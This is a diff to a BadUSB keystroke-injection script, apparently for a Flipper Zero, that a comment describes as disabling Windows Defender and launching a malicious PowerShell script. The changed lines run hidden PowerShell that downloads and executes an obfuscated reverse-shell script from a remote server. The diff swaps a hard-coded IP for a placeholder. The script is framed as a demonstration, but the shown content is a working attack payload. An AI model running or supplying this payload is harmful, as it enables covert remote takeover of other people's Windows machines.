@@ -1,3 +1,4 @@
+REM This script demonstrates how a BadUSB device (like a flipperZero) could be used to disable Windows Defender and launch a malicious PowerShell script from a remote server.
 DELAY 500  # Small delay to ensure the OS is ready
 REM Open Run dialog
 GUI r
@@ -32,5 +33,5 @@ STRING powershell
 ENTER
 DELAY 3000
 REM Run the reverse shell command
-STRING powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.15:8080/RVShell_obfuscated.ps1')"
+STRING powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<server.IP>:8080/RVShell_obfuscated.ps1')"
 ENTER
